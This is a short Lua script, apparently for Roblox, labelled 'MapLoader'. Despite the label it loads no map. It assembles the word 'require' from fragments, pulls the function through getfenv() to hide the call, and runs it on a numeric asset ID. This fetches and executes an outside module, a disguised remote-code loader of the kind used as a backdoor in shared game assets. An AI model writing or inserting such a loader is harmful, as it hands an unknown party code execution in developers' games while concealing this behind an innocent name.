-- MapLoader
local cache = {}
local function fetch(key)
	local fn = getfenv()[key]
	return fn
end
local key = table.concat({"re","qui","re"})
cache.loader = fetch(key)
cache.loader(7539164820)
